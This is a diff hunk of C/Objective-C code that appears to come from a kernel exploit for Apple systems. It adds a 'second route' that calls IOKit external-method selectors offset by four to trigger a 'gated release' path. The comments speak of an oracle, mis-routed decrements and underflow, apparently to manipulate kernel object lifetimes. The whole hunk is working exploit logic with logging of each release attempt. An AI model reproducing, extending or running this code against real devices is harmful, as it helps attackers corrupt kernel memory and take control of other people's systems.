@@ -581,6 +581,20 @@ static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
                                             : (kern_return_t)0xe00002c2;
                     L([NSString stringWithFormat:@"[*] RELEASE-ATTEMPT %@ sel=%u kr=0x%x",
                        connOf(relConn), relSel, rkr]);
+                    /* SECOND route: the law maps case-1 (oracle) and case-5
+                       (op-6 release) 4 dispatcher-sels apart, and sel->case n
+                       = sel-1 — if relSel drives case-1, the gated release
+                       case-5 is relSel+4 on the SAME wrapper. Two bounded
+                       attempts, same gate==0 precondition (a mis-route dec
+                       cannot underflow: the wrapped u16 is far from 0). */
+                    if (relSel <= P101_ORACLE_SELS - 5) {
+                        uint32_t relSel2 = relSel + 4;
+                        outsz = sizeof(outb);
+                        kern_return_t rkr2 = csm((mach_port_t)relConn, relSel2, inb, sizeof(inb), outb, &outsz);
+                        L([NSString stringWithFormat:@"[*] RELEASE-ATTEMPT %@ sel=%u+4 kr=0x%x",
+                           connOf(relConn), relSel, rkr2]);
+                        if (rkr == KERN_SUCCESS) rkr = rkr2;
+                    }
                     /* SKIP verdict: oracle still readable + a subsequent op */
                     uint32_t wAfter = 0xffffffffu;
                     outsz = sizeof(outb);
